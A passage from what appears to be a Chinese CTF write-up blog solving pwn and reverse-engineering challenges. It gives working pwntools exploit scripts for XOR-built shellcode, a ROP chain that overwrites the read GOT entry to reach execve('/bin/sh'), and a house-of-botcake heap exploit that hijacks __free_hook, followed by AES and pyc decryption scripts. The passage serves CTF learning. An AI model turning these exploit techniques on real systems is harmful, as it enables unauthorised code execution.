<li><p>考虑构造十六进制的问题。<code>0xf05</code>比较好构造，用<code>0x4141 ^ 0x4e441</code>即可得到，但是<code>0x5f</code>和<code>0x5e</code>就不好一次异或得到了，作者这里尝试的是通过<code>0x4646 ^ 0x5859 ^ 0x4141</code>得到的这两个汇编。</p>
</li>
<li><p>考虑<code>xor</code>编程的问题。通过尝试，我们发现对于异或语句的编程有两个限制：一个是只能进行双字<code>dword</code>的异或，也就是4个字节；二是不能和立即数进行异或，而要和寄存器进行异或。所以总结下来，格式为<code>xor dword ptr[rdx+0x46], eax</code>。</p>
</li>
<li><p>考虑架构的问题。由于是小端序，所以我们的输入都需要颠倒一下，这里需要一步步调试方可拨云见日。</p>
</li>
</ul>
<p>最终，我们希望能够执行的汇编是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push   rbx			# 0x53</span><br><span class="line">push   rdx			# 0x52</span><br><span class="line">pop    rsi			# 0x5e</span><br><span class="line">pop    rdi			# 0x5f</span><br><span class="line">syscall 			# 0x0f05</span><br></pre></td></tr></table></figure>

<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26714</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh, <span class="string">&#x27;b *$rebase(0x1324)&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax, 0x444e5859;</span></span><br><span class="line"><span class="string">xor dword ptr[rdx+0x44], eax;</span></span><br><span class="line"><span class="string">push rbx;</span></span><br><span class="line"><span class="string">pop rax;</span></span><br><span class="line"><span class="string">xor eax, 0x41414141;</span></span><br><span class="line"><span class="string">xor dword ptr[rdx+0x44], eax;</span></span><br><span class="line"><span class="string">xor dword ptr[rdx+0x46], eax;</span></span><br><span class="line"><span class="string">push rbx;</span></span><br><span class="line"><span class="string">pop rax;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pld = asm(shellcode1)</span><br><span class="line">pld = pld.ljust(<span class="number">0x42</span>, <span class="string">b&#x27;\x50&#x27;</span>)</span><br><span class="line">pld += <span class="string">b&#x27;\x53\x52&#x27;</span></span><br><span class="line">pld += <span class="string">b&#x27;\x46\x46\x41\x41&#x27;</span></span><br><span class="line">pld = pld.ljust(<span class="number">0x200</span>, <span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *$rebase(0x1324)&#x27;)</span></span><br><span class="line">s(pld)</span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x48</span></span><br><span class="line">pld += asm(shellcraft.sh())</span><br><span class="line">s(pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="R-P"><a href="#R-P" class="headerlink" title="R()P"></a>R()P</h3><p>主要考验汇编能力：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 0x0000000000401099 : mov edi, 0x404018 ; jmp rax</span><br><span class="line"></span><br><span class="line">.text:000000000040115A 48 89 C6                      mov     rsi, rax              ; buf</span><br><span class="line">.text:000000000040115D 8B 54 24 0C                   mov     edx, dword ptr [rsp + 0xc] ; nbytes</span><br><span class="line">.text:0000000000401161 31 FF                         xor     edi, edi              ; fd</span><br><span class="line">.text:0000000000401163 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:0000000000401168 E8 C3 FE FF FF                call    _read</span><br><span class="line">.text:000000000040116D 8B 44 24 0C                   mov     eax, dword ptr [rsp + 0xc]</span><br><span class="line">.text:0000000000401171 48 83 C4 18                   add     rsp, 18h</span><br><span class="line">.text:0000000000401175 C3                            retn		</span><br></pre></td></tr></table></figure>

<p>利用的思路是向bss段，也就是<code>0x404018</code>上写入<code>/bin/sh</code>，同时修改read的got表为syscall，最后实现<code>execve(&#39;bin/sh&#39;, 0, 0)</code>获取shell。注意两点问题：一是注意rsp的值，因为rax和rdx的值都是由栈中的数据得到；二是注意rsi和rdx的置零问题，虽然我们修改了read的got表，但是我们走<code>0x40115A</code>还是能够调用read函数，<strong>并且<code>read(0, 0, 0)</code>是可以执行的</strong>。</p>
<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27836</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *0x401175&#x27;)</span></span><br><span class="line"><span class="comment"># /bin/sh -&gt; bss</span></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">pld += p64(<span class="number">0x40116d</span>)        <span class="comment"># eax</span></span><br><span class="line">pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + p32(<span class="number">0x404018</span>)       <span class="comment"># edx &amp; eax</span></span><br><span class="line">pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">pld += p64(<span class="number">0x40115A</span>)</span><br><span class="line"><span class="comment"># read_got -&gt; syscall</span></span><br><span class="line">pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + p32(<span class="number">0x404000</span>)</span><br><span class="line">pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">pld += p64(<span class="number">0x40115A</span>)</span><br><span class="line">pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + p32(<span class="number">1</span>)       </span><br><span class="line">pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line"><span class="comment"># set rsi = rdx = 0</span></span><br><span class="line">pld += p64(<span class="number">0x40116d</span>)</span><br><span class="line">pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + p32(<span class="number">0</span>)</span><br><span class="line">pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">pld += p64(<span class="number">0x40115A</span>) </span><br><span class="line">pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + p32(<span class="number">0</span>)</span><br><span class="line">pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line"><span class="comment"># execve(&#x27;/bin/sh&#x27;, 0, 0)</span></span><br><span class="line">pld += p64(<span class="number">0x40116d</span>)</span><br><span class="line">pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + p32(<span class="number">0x40116d</span>)</span><br><span class="line">pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">pld += p64(<span class="number">0x401099</span>)</span><br><span class="line">pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + p32(<span class="number">59</span>)</span><br><span class="line">pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">pld += p64(<span class="number">0x401030</span>)</span><br><span class="line">s(pld)</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">s(<span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="Magic-Book"><a href="#Magic-Book" class="headerlink" title="Magic_Book"></a>Magic_Book</h3><p>发现存在uaf的情况，并且只能利用一次，同时只能进行18次分配大小小于等于0x100的堆块，还是比较难打的。</p>
<p>一开始是希望通过填满tcache然后在fastbin里面构造<code>double free</code>，虽然可以构造成功，但是没有libc地址的残留。通过网上的WP，发现是通过<code>house of botcake</code>的做法，实现了在<code>tcache</code>和<code>unsortbin</code>里面存在同一个堆块，实现堆重叠。</p>
<blockquote>
<p>参考文章：<a href="https://zikh26.github.io/posts/6b7e3e3a#house-of-botcake">DASCTF X GFCTF 2022十月挑战赛 PWN WP | ZIKH26’s Blog</a></p>
</blockquote>
<p>WP如下（还是要多练）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh, <span class="string">&#x27;x/20gx $rebase(0x4060)&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"><span class="comment"># echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gift</span>(<span class="params">idx</span>):</span><br><span class="line">    <span class="comment"># only once</span></span><br><span class="line">    sla(<span class="string">&#x27;Your choice : &#x27;</span>, <span class="string">b&#x27;9&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, context</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice : &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;Content: &#x27;</span>, context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice : &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xc0</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0xc0</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 1 victim</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0xc0</span>, p64(<span class="number">0</span>)*<span class="number">6</span> + p64(<span class="number">0x160</span>) + p64(<span class="number">0x90</span>))    <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0xc0</span>, <span class="string">b&#x27;pursue&#x27;</span>)    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">gift(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xc0</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 10</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 11</span></span><br><span class="line">add((<span class="number">0xc0</span>-<span class="number">0x70</span>), <span class="string">b&#x27;pursue&#x27;</span>)     <span class="comment"># 12</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;\xa0\x26&#x27;</span>)  <span class="comment"># 13</span></span><br><span class="line">add(<span class="number">0xc0</span>, p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x160</span>))    <span class="comment"># 14</span></span><br><span class="line">add(<span class="number">0xc0</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span>)     <span class="comment"># 15</span></span><br><span class="line"></span><br><span class="line">libc_base = uu64() - <span class="number">0x1ec980</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;sys_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xa0</span> + p64(<span class="number">0xb0</span>) + p64(<span class="number">0x70</span>) + p64(free_hook-<span class="number">8</span>))    <span class="comment"># 16</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)   <span class="comment"># 17</span></span><br><span class="line">add(<span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(sys_addr))   <span class="comment"># 18</span></span><br><span class="line">delete(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="贪玩CTF"><a href="#贪玩CTF" class="headerlink" title="贪玩CTF"></a>贪玩CTF</h3><p>发现不能调试，发现是存在反调试，把<code>jz</code>跳转patch成<code>jmp</code>跳转就可以，<strong>切记要保存文件后才能调试</strong>。</p>
<p>找到关键函数：首先是接受我们输入的用户名和密码，然后会检查两者的长度是不是16，不是就会报错。</p>
<p>首先看关于name的处理，是进行了异或操作：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( name[v17] );</span><br><span class="line"><span class="keyword">if</span> ( v17 != <span class="number">16</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>i64;</span><br><span class="line"></span><br><span class="line">name[<span class="number">0</span>] ^= name[<span class="number">15</span>];</span><br><span class="line">name[<span class="number">1</span>] ^= name[<span class="number">15</span>];</span><br><span class="line">name[<span class="number">2</span>] ^= name[<span class="number">15</span>];</span><br><span class="line">name[<span class="number">3</span>] ^= name[<span class="number">15</span>];</span><br><span class="line">name[<span class="number">4</span>] ^= name[<span class="number">15</span>];</span><br><span class="line">name[<span class="number">5</span>] ^= name[<span class="number">15</span>];</span><br><span class="line">name[<span class="number">6</span>] ^= name[<span class="number">15</span>];</span><br><span class="line">name[<span class="number">7</span>] ^= name[<span class="number">15</span>];</span><br><span class="line">name[<span class="number">8</span>] ^= name[<span class="number">15</span>];</span><br><span class="line">name[<span class="number">9</span>] ^= name[<span class="number">15</span>];</span><br><span class="line">name[<span class="number">10</span>] ^= name[<span class="number">15</span>];</span><br><span class="line">name[<span class="number">11</span>] ^= name[<span class="number">15</span>];</span><br><span class="line">name[<span class="number">12</span>] ^= name[<span class="number">15</span>];</span><br><span class="line">name[<span class="number">13</span>] ^= name[<span class="number">15</span>];</span><br><span class="line">name[<span class="number">14</span>] ^= name[<span class="number">15</span>];</span><br><span class="line">v20 = <span class="number">0</span>i64;</span><br><span class="line"><span class="keyword">while</span> ( name[v20] == name_dest[v20] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ++v20 &gt;= <span class="number">16</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>name的解密脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">0x04</span>, <span class="number">0x1F</span>, <span class="number">0x1F</span>, <span class="number">0x1E</span>, <span class="number">0x43</span>, <span class="number">0x4B</span>, <span class="number">0x43</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x16</span>, <span class="number">0x10</span>, <span class="number">0x55</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x73</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    s[i] ^= s[<span class="number">15</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(s[i]), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># wllm08067sec&amp;das</span></span><br></pre></td></tr></table></figure>

<hr>
<p>接下来看一下password的处理：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( *(&amp;password + v18) );</span><br><span class="line"><span class="keyword">if</span> ( v18 != <span class="number">16</span> || (<span class="type">unsigned</span> <span class="type">int</span>)sub_7FF7DFB91390() )		<span class="comment">// 关键处理点</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>i64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ( byte_7FF7DFB96990[v22] == byte_7FF7DFB943D8[v22] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ++v22 &gt;= <span class="number">16</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入<code>sub_7FF7DFB91390()</code>，发现了S盒和逆S盒，判断是AES加密，在轮密钥加的操作中找到密钥：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v15 = name_4;</span><br><span class="line">v16 = <span class="number">24</span>;</span><br><span class="line">v17 = name_3;</span><br><span class="line">v18 = <span class="number">24</span>;</span><br><span class="line">v19 = name_2;</span><br><span class="line">v20 = <span class="number">0</span>i64;</span><br><span class="line">v21 = name_1;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  *((_BYTE *)&amp;password + v20) ^= v21 &gt;&gt; v18;</span><br><span class="line">  *((_BYTE *)&amp;password + v20 + <span class="number">1</span>) ^= v19 &gt;&gt; v18;</span><br><span class="line">  *((_BYTE *)&amp;password + v20 + <span class="number">2</span>) ^= v17 &gt;&gt; v18;</span><br><span class="line">  v22 = v15 &gt;&gt; v18;</span><br><span class="line">  v18 -= <span class="number">8</span>;</span><br><span class="line">  *((_BYTE *)&amp;password + v20 + <span class="number">3</span>) ^= v22;</span><br><span class="line">  v20 += <span class="number">4</span>i64;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v20 &lt; <span class="number">16</span> );</span><br></pre></td></tr></table></figure>

<p>发现密钥就是用户名，注意<strong>小端序</strong>的问题，WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">s = [<span class="number">0x3C</span>, <span class="number">0x97</span>, <span class="number">0x72</span>, <span class="number">0x96</span>, <span class="number">0x5A</span>, <span class="number">0x33</span>, <span class="number">0x63</span>, <span class="number">0x9C</span>, <span class="number">0x97</span>, <span class="number">0x30</span>, </span><br><span class="line">  <span class="number">0x4D</span>, <span class="number">0x90</span>, <span class="number">0x84</span>, <span class="number">0xE8</span>, <span class="number">0x5F</span>, <span class="number">0x56</span>]</span><br><span class="line">s = <span class="built_in">bytes</span>(s)</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;wllm08067sec&amp;das&#x27;</span> <span class="comment">#秘钥</span></span><br><span class="line">aes = AES.new(key, AES.MODE_ECB) <span class="comment">#创建一个aes对象</span></span><br><span class="line"></span><br><span class="line">dec = aes.decrypt(s) <span class="comment"># 解密密文</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;明文：&quot;</span>, dec)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 明文： b&#x27;e4deb7a6510a10f7&#x27;</span></span><br></pre></td></tr></table></figure>



<h3 id="pycode"><a href="#pycode" class="headerlink" title="pycode"></a>pycode</h3><p>参考：<a href="https://rmrfsad.github.io/2022/10/28/Re/py/#py%E5%AD%97%E8%8A%82%E7%A0%81%EF%BC%88pyc%EF%BC%89%E9%80%86%E5%90%91">Python 逆向 - Pursue (rmrfsad.github.io)</a></p>
<p>WP：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&#x27;8b2e4e858126bc8478d6a6a485215f03&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_number</span>(<span class="params">x</span>):</span><br><span class="line">    x = x ^ (x &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    x = x ^ ((x &lt;&lt; <span class="number">7</span>) &amp; <span class="number">2022072721</span>)</span><br><span class="line">    x = x ^ ((x &lt;&lt; <span class="number">15</span>) &amp; <span class="number">2323163360</span>)</span><br><span class="line">    x = x ^ (x &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">m</span>):</span><br><span class="line">    new_message = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    l = <span class="built_in">len</span>(m)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l//<span class="number">4</span>):</span><br><span class="line">        enc = m[(i * <span class="number">4</span>) : ((i * <span class="number">4</span>) + <span 